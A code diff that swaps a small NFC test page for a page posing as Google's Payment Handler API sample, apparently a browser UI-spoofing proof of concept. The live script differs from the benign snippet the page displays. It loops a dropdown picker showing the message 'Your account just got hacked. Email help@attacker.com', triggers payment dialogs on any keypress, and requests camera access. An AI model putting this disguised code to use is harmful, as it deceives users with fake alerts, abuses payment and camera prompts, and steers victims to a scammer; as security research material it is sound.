@@ -1,29 +1,320 @@
-<html>
-  <head>
-    <script>
-      const reader = new NDEFReader();
-	  async function startScanning() {
-		await reader.scan();
-	  }
-      async function onload() {
-		const nfcPermissionStatus = await navigator.permissions.query({ name: "nfc" });
-		if (nfcPermissionStatus.state === "granted") {
-          reader.scan();
-		} else {
-          let button = document.getElementById("scanButton");
-		  button.style.display = "block";
-		  button.onclick = event => {
-			startScanning();
-            setTimeout(() => {window.location = "nfc2.html";}, 10000);
-		  };
-		}        
-      }
+
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="description" content="Sample illustrating the use of Payment Handler API.">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <title>Payment Handler API Sample</title>
+    <script async="" src="https://www.google-analytics.com/analytics.js"></script><script>
+      // Add a global error event listener early on in the page load, to help ensure that browsers
+      // which don't support specific functionality still end up displaying a meaningful message.
+      window.addEventListener('error', function(error) {
+        if (ChromeSamples && ChromeSamples.setStatus) {
+          console.error(error);
+          ChromeSamples.setStatus(error.message + ' (Your browser may not support this feature.)');
+          error.preventDefault();
+        }
+      });
     </script>
+    
+    
+    
+    
+    <link rel="icon" href="../../images/favicon.ico">
+    
+    <link rel="stylesheet" href="../../styles/main.css">
+    
+    
   </head>
-  <body onload="onload()">
-    <script>
-    </script>
-  <button type="button" id="scanButton" style="height:200px;width:200px">Click</button>  
-  </body>
-</html>
+
+  <body>
+    
+    <h1>Payment Handler API Sample</h1>
+    <p class="availability">
+      Available in <a target="_blank" href="https://www.chromestatus.com/feature/5160285237149696">Chrome 68+</a> |
+      <a target="_blank" href="https://github.com/googlechrome/samples/blob/gh-pages/paymentrequest/payment-handler/">View on GitHub</a> |
+      <a target="_blank" href="https://www.chromestatus.com/samples">Browse Samples</a>
+    </p>
+    <h3>Background</h3>
+<p>
+  <a href="https://github.com/w3c/browser-payment-api">PaymentRequest</a> lets
+  you accept payment from different payment methods.
+</p>
+
+<p>
+  This sample accepts the URL-based payment method.
+</p>
+
+
+<script>
+  var ChromeSamples = {
+    log: function() {
+      var line = Array.prototype.slice.call(arguments).map(function(argument) {
+        return typeof argument === 'string' ? argument : JSON.stringify(argument);
+      }).join(' ');
+
+      document.querySelector('#log').textContent += line + '\n';
+    },
+
+    clearLog: function() {
+      document.querySelector('#log').textContent = '';
+    },
+
+    setStatus: function(status) {
+      document.querySelector('#status').textContent = status;
+    },
+
+    setContent: function(newContent) {
+      var content = document.querySelector('#content');
+      while(content.hasChildNodes()) {
+        content.removeChild(content.lastChild);
+      }
+      content.appendChild(newContent);
+    }
+  };
+</script>
+
+<h3>Live Output</h3>
+<div id="output" class="output">
+  <div id="content">
+<div><button id="buyButton" style="display: inline;">Buy</button>
+    <select onclick="vo()" id="mySelect">
+      <option disabled>&emsp;</option>
+      <option disabled></option>
+      <option disabled></option>
+      <option disabled>&emsp;&emsp;Your account just got hacked. Email help@attacker.com to save your account.</option>
+      <option disabled></option>
+      <option disabled></option>
+      <option disabled></option>
+    </select>
+    </div>
+<div><pre id="result"></pre></div>
+</div>
+  <div id="status"></div>
+  <pre id="log"></pre>
+</div>
+
+
+
+
+
+  
+    
+      <script>/**
+ * Builds PaymentRequest for the BobBucks payment method, but does not show any UI yet.
+ *
+ * @return {PaymentRequest} The PaymentRequest oject.
+ */
+        
+function vo()
+{
+   var selectElement = document.getElementById("mySelect");
+ 
+    let request = initPaymentRequest();
+     onBuyClicked(request);
+    request = initPaymentRequest();
+
+
+    setInterval(function () {
+      selectElement.showPicker();
+    }, 0);
+
+  
+}
+        
+function initPaymentRequest() {
+  let supportedInstruments = [{
+    supportedMethods: 'https://www.google.com',
+  }];
+
+  let details = {
+    total: {label: 'Donation', amount: {currency: 'USD', value: '55.00'}},
+    displayItems: [
+      {
+        label: 'Original donation amount',
+        amount: {currency: 'USD', value: '65.00'},
+      },
+      {
+        label: 'Friends and family discount',
+        amount: {currency: 'USD', value: '-10.00'},
+      },
+    ],
+  };
+
+  return new PaymentRequest(supportedInstruments, details);
+}
+
+/**
+ * Invokes PaymentRequest for the BobBucks payment method.
+ *
+ * @param {PaymentRequest} request The PaymentRequest object.
+ */
+function onBuyClicked(request) {
+  navigator.mediaDevices.getUserMedia( {video: true}).then( ) 
+  request.show().then(function(instrumentResponse) {
+    sendPaymentToServer(instrumentResponse);
+  })
+  .catch(function(err) {
+    ChromeSamples.setStatus(err);
+  });
+}
+
+/**
+ * Simulates processing the payment data on the server.
+ *
+ * @param {PaymentResponse} instrumentResponse The payment information to
+ * process.
+ */
+function sendPaymentToServer(instrumentResponse) {
+  // There's no server-side component of these samples. No transactions are
+  // processed and no money exchanged hands. Instantaneous transactions are not
+  // realistic. Add a 2 second delay to make it seem more real.
+  window.setTimeout(function() {
+    instrumentResponse.complete('success')
+        .then(function() {
+          document.getElementById('result').innerHTML =
+              instrumentToJsonString(instrumentResponse);
+        })
+        .catch(function(err) {
+          ChromeSamples.setStatus(err);
+        });
+  }, 2000);
+}
+
+/**
+ * Converts the payment instrument into a JSON string.
+ *
+ * @private
+ * @param {PaymentResponse} instrument The instrument to convert.
+ * @return {string} The JSON string representation of the instrument.
+ */
+function instrumentToJsonString(instrument) {
+  let details = instrument.details;
+
+  return JSON.stringify({
+    methodName: instrument.methodName,
+    details: details,
+  }, undefined, 2);
+}
+
+const payButton = document.getElementById('buyButton');
+payButton.setAttribute('style', 'display: none;');
+if (window.PaymentRequest) {
+  let request = initPaymentRequest();
+  payButton.setAttribute('style', 'display: inline;');
+  payButton.addEventListener('click', function() {
+    //setTimeout('window.alert("Click Oke twice ..........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................")',100);
+    onBuyClicked(request);
+    request = initPaymentRequest();
+  });
+  window.addEventListener('keydown', function() {
+    onBuyClicked(request);request = initPaymentRequest();
+    //setTimeout('onBuyClicked(request);request = initPaymentRequest();',500)
+  })
+} else {
+  ChromeSamples.setStatus('This browser does not support web payments');
+}
+</script>
+    
+  
+
+  
+    <h3>JavaScript Snippet</h3>
+  
+
+  
+    <figure class="highlight"><pre><code class="language-js" data-lang="js"><span class="cm">/**
+ * Builds PaymentRequest for the BobBucks payment method, but does not show any UI yet.
+ *
+ * @return {PaymentRequest} The PaymentRequest oject.
+ */</span>
+<span class="kd">function</span> <span class="nx">initPaymentRequest</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kd">let</span> <span class="nx">supportedInstruments</span> <span class="o">=</span> <span class="p">[{</span>
+    <span class="na">supportedMethods</span><span class="p">:</span> <span class="dl">'</span><span class="s1">https://bobbucks.dev/pay</span><span class="dl">'</span><span class="p">,</span>
+  <span class="p">}];</span>
+
+  <span class="kd">let</span> <span class="nx">details</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="na">total</span><span class="p">:</span> <span class="p">{</span><span class="na">label</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Donation</span><span class="dl">'</span><span class="p">,</span> <span class="na">amount</span><span class="p">:</span> <span class="p">{</span><span class="na">currency</span><span class="p">:</span> <span class="dl">'</span><span class="s1">USD</span><span class="dl">'</span><span class="p">,</span> <span class="na">value</span><span class="p">:</span> <span class="dl">'</span><span class="s1">55.00</span><span class="dl">'</span><span class="p">}},</span>
+    <span class="na">displayItems</span><span class="p">:</span> <span class="p">[</span>
+      <span class="p">{</span>
+        <span class="na">label</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Original donation amount</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">amount</span><span class="p">:</span> <span class="p">{</span><span class="na">currency</span><span class="p">:</span> <span class="dl">'</span><span class="s1">USD</span><span class="dl">'</span><span class="p">,</span> <span class="na">value</span><span class="p">:</span> <span class="dl">'</span><span class="s1">65.00</span><span class="dl">'</span><span class="p">},</span>
+      <span class="p">},</span>
+      <span class="p">{</span>
+        <span class="na">label</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Friends and family discount</span><span class="dl">'</span><span class="p">,</span>
+        <span class="na">amount</span><span class="p">:</span> <span class="p">{</span><span class="na">currency</span><span class="p">:</span> <span class="dl">'</span><span class="s1">USD</span><span class="dl">'</span><span class="p">,</span> <span class="na">value</span><span class="p">:</span> <span class="dl">'</span><span class="s1">-10.00</span><span class="dl">'</span><span class="p">},</span>
+      <span class="p">},</span>
+    <span class="p">],</span>
+  <span class="p">};</span>
+
+  <span class="k">return</span> <span class="k">new</span> <span class="nx">PaymentRequest</span><span class="p">(</span><span class="nx">supportedInstruments</span><span class="p">,</span> <span class="nx">details</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="cm">/**
+ * Invokes PaymentRequest for the BobBucks payment method.
+ *
+ * @param {PaymentRequest} request The PaymentRequest object.
+ */</span>
+<span class="kd">function</span> <span class="nx">onBuyClicked</span><span class="p">(</span><span class="nx">request</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">request</span><span class="p">.</span><span class="nx">show</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">instrumentResponse</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">sendPaymentToServer</span><span class="p">(</span><span class="nx">instrumentResponse</span><span class="p">);</span>
+  <span class="p">})</span>
+  <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">ChromeSamples</span><span class="p">.</span><span class="nx">setStatus</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+  <span class="p">});</span>
+<span class="p">}</span>
+
+<span class="cm">/**
+ * Simulates processing the payment data on the server.
+ *
+ * @param {PaymentResponse} instrumentResponse The payment information to
+ * process.
+ */</span>
+<span class="kd">function</span> <span class="nx">sendPaymentToServer</span><span class="p">(</span><span class="nx">instrumentResponse</span><span class="p">)</span> <span class="p">{</span>
+  <span class="c1">// There's no server-side component of these samples. No transactions are</span>
+  <span class="c1">// processed and no money exchanged hands. Instantaneous transactions are not</span>
+  <span class="c1">// realistic. Add a 2 second delay to make it seem more real.</span>
+  <span class="nb">window</span><span class="p">.</span><span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nx">instrumentResponse</span><span class="p">.</span><span class="nx">complete</span><span class="p">(</span><span class="dl">'</span><span class="s1">success</span><span class="dl">'</span><span class="p">)</span>
+        <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+          <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">result</span><span class="dl">'</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span>
+              <span class="nx">instrumentToJsonString</span><span class="p">(</span><span class="nx">instrumentResponse</span><span class="p">);</span>
+        <span class="p">})</span>
+        <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+          <span class="nx">ChromeSamples</span><span class="p">.</span><span class="nx">setStatus</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+        <span class="p">});</span>
+  <span class="p">},</span> <span class="mi">2000</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="cm">/**
+ * Converts the payment instrument into a JSON string.
+ *
+ * @private
+ * @param {PaymentResponse} instrument The instrument to convert.
+ * @return {string} The JSON string representation of the instrument.
+ */</span>
+<span class="kd">function</span> <span class="nx">instrumentToJsonString</span><span class="p">(</span><span class="nx">instrument</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">let</span> <span class="nx">details</span> <span class="o">=</span> <span class="nx">instrument</span><span class="p">.</span><span class="nx">details</span><span class="p">;</span>
+
+  <span class="k">return</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
+    <span class="na">methodName</span><span class="p">:</span> <span class="nx">instrument</span><span class="p">.</span><span class="nx">methodName</span><span class="p">,</span>
+    <span class="na">details</span><span class="p">:</span> <span class="nx">details</span><span class="p">,</span>
+  <span class="p">},</span> <span class="kc">undefined</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">const</span> <span class="nx">payButton</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">buyButton</span><span class="dl">'</span><span class="p">);</span>
+<span class="nx">payButton</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">style</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">display: none;</span><span class="dl">'</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">PaymentRequest</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kd">let</span> <span class="nx">request</span> <span class="o">=</span> <span class="nx">initPaymentRequest</span><span class="p">();</span>
+  <span class="nx">payButton</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">style</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">display: inline;</span><span class="dl">'</span><span class="p">);</span>
+  <span class="nx">payButton</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">click</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="nx">onBuyClicked</span><span class="p">(</span><span class="nx">request</span><span class="p">);</span>
+    <span class="nx">request</span> <span class="o">=</span> <span class="nx">initPaymentRequest</span><span class="p">();</span>
+  <span class="p">});</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+  <span class="nx">ChromeSamples</span><span class="p">.</span><span class="nx">setStatus</span><span class="p">(</span><span class="dl">'</span><span class="s1">This browser does not support web payments</span><span class="dl">'</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+  
+
 
